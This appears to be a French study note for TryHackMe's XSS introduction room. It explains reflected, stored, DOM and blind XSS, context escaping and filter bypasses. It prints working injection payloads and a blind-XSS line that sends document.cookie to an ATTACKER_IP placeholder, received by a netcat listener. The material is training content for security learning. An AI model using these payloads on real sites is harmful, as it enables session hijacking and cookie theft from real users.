---
title: "XSS Introduction"
category: rooms
icon: "🐛"
difficulty: "Medium"
platform: "THM"
status: "Terminée"
tags: [web, xss, cross-site-scripting, reflected, stored, dom, blind-xss, filter-bypass, cookie-theft]
summary: "Intro XSS : les 4 types (reflected/stored/DOM/blind), l'echappement de contexte (le vrai skill), les bypass de filtres basiques, et l'exfiltration de cookie en blind XSS via fetch."
updated: 2026-11-02
source: agent
---

> Room guidée : introduction au XSS (Cross-Site Scripting). Les 4 types (reflected / stored / DOM / blind), le concept clé d'échappement de contexte, et l'exfiltration de cookie en blind XSS.

## TL;DR
XSS = injecter du JS qui s'exécute dans le navigateur d'une AUTRE victime. Le serveur (ou le JS de la page) renvoie une entrée utilisateur sans l'échapper → ton code tourne dans leur session.

## Les 4 types
| Type | Où vit le payload | Déclenchement |
|---|---|---|
| **Reflected** | dans la requête (param URL, chemin, header) renvoyé direct dans la page | victime clique un lien piégé |
| **Stored** | enregistré côté serveur (commentaire, profil, DB) | chaque visiteur de la page, automatiquement |
| **DOM-based** | nulle part côté serveur — le JS de la page lit une source contrôlable (`location.hash`) et l'écrit dans le DOM | côté client, sans aller-retour serveur |
| **Blind** | stocké, mais tu ne vois PAS l'exécution (ticket support, back-office admin) | quand un employé ouvre ton entrée → callback réseau |

## Le vrai skill : échapper au contexte
Un payload ne marche que s'il "sort" d'abord de là où il est reflété. Il faut lire le HTML source pour voir le contexte :
- **Contexte HTML libre** → `<script>alert('THM')</script>`
- **Dans un attribut `value="..."`** → fermer l'attribut + la balise : `"><script>alert('THM')</script>`
- **Dans un `<textarea>`** → `</textarea><script>alert('THM')</script>`
- **Dans du JS inline** (`var x='...'`) → fermer la chaîne, finir l'instruction, commenter la suite : `';alert('THM');//`

## Bypass de filtres basiques
- **Filtre qui retire le mot `script`** → l'imbriquer : `<sscriptcript>...</sscriptcript>` (après suppression du `script` interne il reste `<script>`).
- **Filtre qui bloque `<` et `>`** → pas besoin de nouvelle balise, détourner un attribut d'événement d'une balise existante : `" onload="alert('THM')` / `onerror=alert('THM')` sur une `<img>`.
- **Polyglotte** = un seul payload qui s'échappe de plusieurs contextes à la fois (souvent à base de `<svg onload=...>` + `onerror`).

## Blind XSS — exfiltration de cookie
Payload stocké qui, une fois ouvert par la cible, renvoie son cookie vers ton listener :
```html
</textarea><script>fetch('http://ATTACKER_IP?cookie=' + btoa(document.cookie))</script>
```
Listener côté attackbox : `nc -nlvp 9001` (ou XSS Hunter pour du blind à grande échelle). Le `btoa()` encode en base64 pour éviter que les caractères du cookie cassent l'URL.

## Réflexes acquis
- **Réflexe** : avant de balancer un payload au pif, REGARDER le code source pour voir dans quel contexte ton input atterrit (texte HTML ? attribut ? textarea ? JS ?). Le contexte dicte comment tu dois t'en échapper (`">`, `</textarea>`, `';//`...).
- **Réflexe** : `alert()` sert juste à PROUVER l'exécution (PoC). La vraie exploitation c'est vol de cookie/session (`document.cookie` + `fetch`), keylogging, ou actions dans la session de la victime.
- **Réflexe** : un filtre qui retire une seule fois un mot (`script`) ou qui bloque des chars se contourne — mot imbriqué, handlers d'événements (`onerror`/`onload`), encodage. La validation côté client ne protège jamais : elle se bypass en rejouant la requête (Burp Repeater).
- **Réflexe (blind)** : si ton input part dans un endroit que tu ne vois pas (formulaire de contact, ticket), c'est du blind XSS → payload avec callback (`fetch` vers un listener) pour savoir s'il s'exécute et où.
